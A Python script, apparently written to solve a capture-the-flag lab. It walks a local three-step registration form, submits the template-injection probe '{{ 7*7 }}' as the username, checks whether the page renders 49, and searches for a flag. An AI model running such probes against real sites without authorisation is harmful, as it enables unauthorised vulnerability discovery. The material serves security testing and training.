import urllib.request
import urllib.parse
import http.cookiejar
import re

# Setup cookie handling
cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))
urllib.request.install_opener(opener)

url = "http://127.0.0.1:32896"

# Step 1 GET
req = urllib.request.Request(f"{url}/accounts/register/step1/")
resp = urllib.request.urlopen(req)
html = resp.read().decode('utf-8')
print(f"Step 1 GET: {resp.status}")

# Extract CSRF token
csrf_match = re.search(r'name=["\']csrfmiddlewaretoken["\'] value=["\']([^"\']+)["\']', html)
if not csrf_match:
    csrf_match = re.search(r'csrfmiddlewaretoken["\']?\s*:\s*["\']([^"\']+)["\']', html)

csrf_token = csrf_match.group(1) if csrf_match else ""
print(f"CSRF: {csrf_token[:20]}...")

# Step 1 POST with SSTI payload
data = {
    'csrfmiddlewaretoken': csrf_token,
    'username': '{{ 7*7 }}',
    'email': 'test@test.com',
    'password1': 'TestPass123',
    'password2': 'TestPass123'
}
post_data = urllib.parse.urlencode(data).encode('utf-8')
req = urllib.request.Request(f"{url}/accounts/register/step1/", data=post_data)
resp = urllib.request.urlopen(req)
print(f"Step 1 POST: {resp.status}")

# Step 2 GET
req = urllib.request.Request(f"{url}/accounts/register/step2/")
resp = urllib.request.urlopen(req)
html = resp.read().decode('utf-8')
print(f"Step 2 GET: {resp.status}")

# Extract CSRF
csrf_match = re.search(r'name=["\']csrfmiddlewaretoken["\'] value=["\']([^"\']+)["\']', html)
if not csrf_match:
    csrf_match = re.search(r'csrfmiddlewaretoken["\']?\s*:\s*["\']([^"\']+)["\']', html)
csrf_token = csrf_match.group(1) if csrf_match else ""

# Step 2 POST
data = {
    'csrfmiddlewaretoken': csrf_token,
    'bio': 'test',
    'favorite_artist': 'test'
}
post_data = urllib.parse.urlencode(data).encode('utf-8')
req = urllib.request.Request(f"{url}/accounts/register/step2/", data=post_data)
resp = urllib.request.urlopen(req)
print(f"Step 2 POST: {resp.status}")

# Step 3 GET - check for SSTI
req = urllib.request.Request(f"{url}/accounts/register/step3/")
resp = urllib.request.urlopen(req)
html = resp.read().decode('utf-8')
print(f"Step 3 GET: {resp.status}\n")

print("="*60)
print("Step 3 Response:")
print("="*60)
print(html)
print("="*60)

# Analysis
if '49' in html and '{{ 7*7 }}' not in html:
    print("\n[!!!] SSTI DETECTED: {{ 7*7 }} evaluated to 49")
elif '{{ 7*7 }}' in html:
    print("\n[i] Literal payload found - not evaluated")

flag = re.search(r'FLAG\{[^}]+\}', html)
if flag:
    print(f"\n[!!!] FLAG: {flag.group(0)}")

